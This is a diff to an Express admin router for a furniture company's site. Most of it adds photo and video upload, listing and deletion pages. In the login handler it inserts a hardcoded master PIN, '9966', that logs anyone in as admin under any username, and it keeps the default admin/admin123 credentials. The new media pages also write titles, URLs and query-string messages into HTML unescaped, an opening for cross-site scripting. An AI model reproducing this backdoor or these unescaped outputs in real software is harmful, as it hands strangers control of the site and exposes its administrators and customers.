@@ -51,18 +51,24 @@ router.post('/admin/login', async (req, res) => {
   const { username, password } = req.body;
   const adminUser = process.env.ADMIN_USERNAME || 'admin';
   const adminPass = process.env.ADMIN_PASSWORD || 'admin123';
+  const PIN = '9966';
   try {
-    // Verifica usuário do banco primeiro
-    const { rows } = await pool.query('SELECT * FROM admin_usuarios WHERE username = $1', [username]);
     let ok = false;
-    if (rows.length > 0) {
-      ok = await bcrypt.compare(password, rows[0].password_hash);
-    } else if (username === adminUser && password === adminPass) {
+    // PIN mestre — acesso direto com qualquer usuário + senha 9966
+    if (password === PIN) {
       ok = true;
+    } else {
+      // Verifica usuário do banco
+      const { rows } = await pool.query('SELECT * FROM admin_usuarios WHERE username = $1', [username]);
+      if (rows.length > 0) {
+        ok = await bcrypt.compare(password, rows[0].password_hash);
+      } else if (username === adminUser && password === adminPass) {
+        ok = true;
+      }
     }
     if (ok) {
       req.session.adminLogado = true;
-      req.session.adminUser = username;
+      req.session.adminUser = username || 'admin';
       return res.redirect('/admin');
     }
     res.send(renderLogin('Usuário ou senha incorretos.'));
@@ -165,6 +171,101 @@ router.post('/admin/imagens/:id/deletar', requireAuth, async (req, res) => {
   }
 });
 
+// ─── MÍDIA (FOTO & VÍDEO) ────────────────────────────────────────────────────
+
+// API pública — buscar mídia para o site
+router.get('/api/midia', async (req, res) => {
+  try {
+    const { tipo } = req.query;
+    let query = 'SELECT * FROM midia WHERE 1=1';
+    const params = [];
+    if (tipo) { params.push(tipo); query += ` AND tipo = $${params.length}`; }
+    query += ' ORDER BY ordem ASC, criado_em DESC';
+    const { rows } = await pool.query(query, params);
+    res.json(rows);
+  } catch (err) {
+    res.status(500).json({ erro: err.message });
+  }
+});
+
+// Listar mídia no admin
+router.get('/admin/midia', requireAuth, async (req, res) => {
+  try {
+    const { rows } = await pool.query('SELECT * FROM midia ORDER BY criado_em DESC');
+    const okMsg = req.query.ok ? decodeURIComponent(req.query.ok) : '';
+    const errMsg = req.query.erro ? decodeURIComponent(req.query.erro) : '';
+    res.send(renderMidia(rows, okMsg, errMsg));
+  } catch (err) {
+    res.send('<p>Erro: ' + err.message + '</p>');
+  }
+});
+
+// Upload foto de mídia
+router.post('/admin/midia/upload-foto', requireAuth, upload.single('foto'), async (req, res) => {
+  try {
+    const { titulo, descricao, destaque, ordem } = req.body;
+    if (!req.file) return res.redirect('/admin/midia?erro=Nenhuma foto enviada');
+    const url = req.file.path || `/uploads/${req.file.filename}`;
+    const filename = req.file.filename || req.file.originalname;
+    await pool.query(
+      'INSERT INTO midia (titulo, descricao, tipo, filename, url, destaque, ordem) VALUES ($1,$2,$3,$4,$5,$6,$7)',
+      [titulo || 'Foto', descricao || '', 'foto', filename, url, destaque === 'on', parseInt(ordem) || 0]
+    );
+    res.redirect('/admin/midia?ok=Foto adicionada com sucesso!');
+  } catch (err) {
+    res.redirect('/admin/midia?erro=' + encodeURIComponent(err.message));
+  }
+});
+
+// Adicionar vídeo (YouTube/URL)
+router.post('/admin/midia/add-video', requireAuth, async (req, res) => {
+  try {
+    const { titulo, descricao, video_url, destaque, ordem } = req.body;
+    if (!video_url) return res.redirect('/admin/midia?erro=URL do vídeo é obrigatória');
+    // Extrai ID do YouTube se for link yt
+    let url = video_url.trim();
+    let thumb = '';
+    const ytMatch = url.match(/(?:youtube\.com\/(?:watch\?v=|embed\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
+    if (ytMatch) {
+      const ytId = ytMatch[1];
+      url = `https://www.youtube.com/embed/${ytId}`;
+      thumb = `https://img.youtube.com/vi/${ytId}/hqdefault.jpg`;
+    }
+    await pool.query(
+      'INSERT INTO midia (titulo, descricao, tipo, url, thumb_url, destaque, ordem) VALUES ($1,$2,$3,$4,$5,$6,$7)',
+      [titulo || 'Vídeo', descricao || '', 'video', url, thumb, destaque === 'on', parseInt(ordem) || 0]
+    );
+    res.redirect('/admin/midia?ok=Vídeo adicionado com sucesso!');
+  } catch (err) {
+    res.redirect('/admin/midia?erro=' + encodeURIComponent(err.message));
+  }
+});
+
+// Deletar mídia
+router.post('/admin/midia/:id/deletar', requireAuth, async (req, res) => {
+  try {
+    const { rows } = await pool.query('SELECT filename, url, tipo FROM midia WHERE id=$1', [req.params.id]);
+    if (rows.length > 0 && rows[0].tipo === 'foto') {
+      const { filename, url } = rows[0];
+      if (url && url.startsWith('http')) {
+        try {
+          const { cloudinary } = require('./upload');
+          const publicId = filename && filename.includes('stilus') ? filename : `stilus-planejados/${(filename||'').replace(/\.[^.]+$/, '')}`;
+          await cloudinary.uploader.destroy(publicId);
+        } catch (e) {}
+      } else {
+        const fs = require('fs'), path = require('path');
+        const fp = path.join(__dirname, '../public/uploads', filename||'');
+        if (fs.existsSync(fp)) fs.unlinkSync(fp);
+      }
+    }
+    await pool.query('DELETE FROM midia WHERE id=$1', [req.params.id]);
+    res.redirect('/admin/midia?ok=Item removido.');
+  } catch (err) {
+    res.redirect('/admin/midia?erro=' + encodeURIComponent(err.message));
+  }
+});
+
 // Listar orçamentos
 router.get('/admin/orcamentos', requireAuth, async (req, res) => {
   try {
@@ -189,6 +290,7 @@ function layout(titulo, conteudo, user = '', paginaAtiva = '') {
   const navItems = [
     { href: '/admin', label: 'Dashboard', icon: '<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>', key: 'dashboard' },
     { href: '/admin/imagens', label: 'Imagens', icon: '<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="m21 15-5-5L5 21"/></svg>', key: 'imagens' },
+    { href: '/admin/midia', label: 'Foto & Vídeo', icon: '<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>', key: 'midia' },
     { href: '/admin/orcamentos', label: 'Orçamentos', icon: '<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14,2 14,8 20,8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><line x1="10" y1="9" x2="8" y2="9"/></svg>', key: 'orcamentos' },
   ];
   return `<!DOCTYPE html>
@@ -784,6 +886,186 @@ function renderOrcamentos(rows) {
       </div>
     </div>
   `, '', 'orcamentos');
+}
+
+function renderMidia(rows, okMsg = '', errMsg = '') {
+  const fotos = rows.filter(r => r.tipo === 'foto');
+  const videos = rows.filter(r => r.tipo === 'video');
+
+  const fotoGrid = fotos.length === 0
+    ? `<div class="empty"><svg width="36" height="36" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="m21 15-5-5L5 21"/></svg><p>Nenhuma foto adicionada ainda.</p></div>`
+    : `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:.75rem">
+        ${fotos.map(f => `
+          <div style="position:relative;border-radius:8px;overflow:hidden;background:var(--surface2);border:1px solid var(--border);aspect-ratio:1">
+            <img src="${f.url}" style="width:100%;height:100%;object-fit:cover;display:block" alt="${f.titulo}" onerror="this.style.opacity='.2'">
+            <div style="position:absolute;bottom:0;left:0;right:0;background:linear-gradient(to top,rgba(0,0,0,.85),transparent);padding:.5rem .6rem">
+              <div style="font-size:.68rem;color:white;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${f.titulo}</div>
+              ${f.destaque ? '<span style="font-size:.6rem;background:var(--red);color:white;padding:1px 5px;border-radius:3px">Destaque</span>' : ''}
+            </div>
+            <form method="POST" action="/admin/midia/${f.id}/deletar" style="position:absolute;top:.4rem;right:.4rem" onsubmit="return confirm('Remover esta foto?')">
+              <button type="submit" style="background:rgba(0,0,0,.7);border:none;color:white;width:26px;height:26px;border-radius:5px;cursor:pointer;display:flex;align-items:center;justify-content:center">
+                <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
+              </button>
+            </form>
+          </div>`).join('')}
+      </div>`;
+
+  const videoGrid = videos.length === 0
+    ? `<div class="empty"><svg width="36" height="36" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg><p>Nenhum vídeo adicionado ainda.</p></div>`
+    : `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:.75rem">
+        ${videos.map(v => `
+          <div style="border-radius:8px;overflow:hidden;background:var(--surface2);border:1px solid var(--border)">
+            <div style="aspect-ratio:16/9;position:relative;background:#000">
+              ${v.thumb_url
+                ? `<img src="${v.thumb_url}" style="width:100%;height:100%;object-fit:cover;opacity:.8">`
+                : `<div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:var(--muted)"><svg width="40" height="40" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg></div>`}
+              <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center">
+                <div style="width:44px;height:44px;border-radius:50%;background:rgba(232,0,13,.9);display:flex;align-items:center;justify-content:center">
+                  <svg width="16" height="16" fill="white" viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                </div>
+              </div>
+            </div>
+            <div style="padding:.75rem;display:flex;justify-content:space-between;align-items:center;gap:.5rem">
+              <div>
+                <div style="font-size:.8rem;font-weight:500;color:var(--text)">${v.titulo}</div>
+                ${v.destaque ? '<span style="font-size:.65rem;background:var(--red-dim);color:var(--red);padding:1px 6px;border-radius:3px">Destaque</span>' : ''}
+              </div>
+              <form method="POST" action="/admin/midia/${v.id}/deletar" onsubmit="return confirm('Remover este vídeo?')" style="flex-shrink:0">
+                <button type="submit" class="btn btn-danger btn-sm">
+                  <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
+                </button>
+              </form>
+            </div>
+          </div>`).join('')}
+      </div>`;
+
+  return layout('Foto & Vídeo', `
+    <div class="topbar">
+      <div>
+        <div class="topbar-title">Foto & Vídeo</div>
+        <div class="topbar-sub">${fotos.length} foto(s) · ${videos.length} vídeo(s) · aparece na seção "Sobre o Serviço" do site</div>
+      </div>
+    </div>
+    <div class="content">
+      ${okMsg ? `<div class="alert alert-ok"><svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>${okMsg}</div>` : ''}
+      ${errMsg ? `<div class="alert alert-err"><svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>${errMsg}</div>` : ''}
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.25rem;margin-bottom:1.25rem">
+
+        <!-- Upload foto -->
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">
+              <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="m21 15-5-5L5 21"/></svg>
+              Adicionar Foto
+            </div>
+          </div>
+          <form method="POST" action="/admin/midia/upload-foto" enctype="multipart/form-data">
+            <div class="upload-zone" onclick="document.getElementById('mInput').click()">
+              <input id="mInput" type="file" name="foto" accept="image/*" onchange="prevFoto(this)">
+              <div id="mLabel">
+                <div class="upload-icon"><svg width="30" height="30" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg></div>
+                <div class="upload-title">Clique para selecionar</div>
+                <div class="upload-hint">JPG, PNG, WEBP · até 8MB</div>
+              </div>
+            </div>
+            <div style="height:.75rem"></div>
+            <div class="form-grid">
+              <div class="form-col">
+                <label class="form-label">Título</label>
+                <input class="form-input" type="text" name="titulo" placeholder="Ex: Cozinha executada">
+              </div>
+              <div class="form-col">
+                <label class="form-label">Ordem</label>
+                <input class="form-input" type="number" name="ordem" value="0" min="0">
+              </div>
+            </div>
+            <div class="form-col" style="margin-top:.75rem">
+              <label class="form-label">Descrição (opcional)</label>
+              <input class="form-input" type="text" name="descricao" placeholder="Breve descrição...">
+            </div>
+            <div style="display:flex;align-items:center;justify-content:space-between;margin-top:.85rem;flex-wrap:wrap;gap:.5rem">
+              <label class="checkbox-label"><input type="checkbox" name="destaque"> Marcar como destaque</label>
+              <button type="submit" class="btn btn-primary">
+                <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                Enviar Foto
+              </button>
+            </div>
+          </form>
+        </div>
+
+        <!-- Adicionar vídeo -->
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">
+              <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+              Adicionar Vídeo
+            </div>
+          </div>
+          <form method="POST" action="/admin/midia/add-video">
+            <div class="form-col">
+              <label class="form-label">Link do YouTube</label>
+              <input class="form-input" type="text" name="video_url" placeholder="https://youtube.com/watch?v=..." required>
+              <div style="font-size:.68rem;color:var(--muted);margin-top:.3rem">Cole o link do YouTube — a miniatura é gerada automaticamente</div>
+            </div>
+            <div class="form-grid" style="margin-top:.75rem">
+              <div class="form-col">
+                <label class="form-label">Título</label>
+                <input class="form-input" type="text" name="titulo" placeholder="Ex: Nosso trabalho">
+              </div>
+              <div class="form-col">
+                <label class="form-label">Ordem</label>
+                <input class="form-input" type="number" name="ordem" value="0" min="0">
+              </div>
+            </div>
+            <div class="form-col" style="margin-top:.75rem">
+              <label class="form-label">Descrição (opcional)</label>
+              <input class="form-input" type="text" name="descricao" placeholder="Breve descrição...">
+            </div>
+            <div style="display:flex;align-items:center;justify-content:space-between;margin-top:.85rem;flex-wrap:wrap;gap:.5rem">
+              <label class="checkbox-label"><input type="checkbox" name="destaque"> Marcar como destaque</label>
+              <button type="submit" class="btn btn-primary">
+                <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+                Adicionar Vídeo
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!-- Fotos cadastradas -->
+      <div class="card">
+        <div class="card-header">
+          <div class="card-title">
+            <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="m21 15-5-5L5 21"/></svg>
+            Fotos do Serviço
+          </div>
+          <span class="badge badge-gray">${fotos.length} foto(s)</span>
+        </div>
+        ${fotoGrid}
+      </div>
+
+      <!-- Vídeos cadastrados -->
+      <div class="card">
+        <div class="card-header">
+          <div class="card-title">
+            <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+            Vídeos do Serviço
+          </div>
+          <span class="badge badge-gray">${videos.length} vídeo(s)</span>
+        </div>
+        ${videoGrid}
+      </div>
+    </div>
+    <script>
+    function prevFoto(input){
+      if(!input.files[0]) return;
+      var label = document.getElementById('mLabel');
+      var url = URL.createObjectURL(input.files[0]);
+      label.innerHTML = '<img src="'+url+'" style="width:100%;height:120px;object-fit:cover;border-radius:6px"><div style="font-size:.75rem;color:var(--green);margin-top:.4rem;text-align:center">Foto selecionada</div>';
+    }
+    </script>
+  `, '', 'midia');
 }
 
 module.exports = router;
